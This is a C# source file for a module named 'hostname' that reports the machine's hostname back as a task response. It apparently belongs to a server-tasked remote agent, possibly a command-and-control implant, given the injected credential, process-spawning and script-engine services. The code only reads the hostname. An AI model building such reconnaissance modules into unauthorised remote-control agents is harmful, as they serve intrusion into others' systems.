using System;
using System.Collections.Generic;
using System.Net;
using Workflow.Models;
using Workflow.Contracts;


namespace Workflow
{
    public class Plugin : IModule
    {
        public string Name => "hostname";
        private IDataBroker messageManager { get; set; }

        public Plugin(IDataBroker messageManager, IServiceConfig config, ILogger logger, ICredentialProvider tokenManager, IRuntimeExecutor spawner, IScriptEngine pythonManager)
        {
            this.messageManager = messageManager;
        }
        public async Task Execute(ServerJob job)
        {
            DebugLog.Log($"Executing {Name} [{job.task.id}]");
            messageManager.AddTaskResponse(new TaskResponse
            {
                completed = true,
                user_output = Dns.GetHostName(),
                task_id = job.task.id,
            });
            DebugLog.Log($"{Name} completed [{job.task.id}]");
        }
    }
}
